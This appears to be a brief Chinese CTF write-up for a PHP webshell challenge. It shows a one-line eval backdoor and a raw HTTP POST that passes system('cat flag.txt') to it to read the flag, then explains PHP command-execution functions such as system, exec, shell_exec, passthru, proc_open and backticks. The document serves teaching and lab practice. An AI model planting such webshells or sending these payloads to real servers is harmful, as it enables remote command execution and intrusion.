@@ -1,0 +1,70 @@
+题目纲要：
+你会使用webshell吗？
+<?php @eval($_POST['shell']);?> 
+
+解题思路：用post提交shell，让eval执行shell里面的内容
+
+
+浏览器头信息：
+————————————————————————————————————————————————————————————————————————————————
+POST / HTTP/1.1
+
+Host: 220.249.52.133:57487
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 29
+
+
+
+shell=system('cat flag.txt');
+
+—————————————————————————————————————————————————————————————————————————————————
+
+下面是PHP中一些执行shell命令最常用的函数。
+
+system()
+
+system()函数将命令作为参数，并输出结果。
+
+
+
+exec()
+
+exec()功能是将命令作为参数，但不输出结果。如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。
+用exec()函数执行echo命令，只会输出最后一行命令结果。
+如果指定了第二个参数，则返回结果为数组。
+
+
+
+shell_exec()
+
+shell_exec()函数类似于exec()，但是，其整个输出结果为字符串。
+
+
+
+passthru()
+
+passthru()执行一个命令并返回原始格式的输出。
+
+
+
+proc_open()
+
+proc_open()函数可能很难理解。简单地说，我们可以使用proc_open()，创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。
+
+倒引号
+
+很多PHP开发人员并没有意识到这一点，但是PHP会首先执行shell命令中倒引号（`）内的内容。请注意，倒引号（`）和单引号（’）不同。
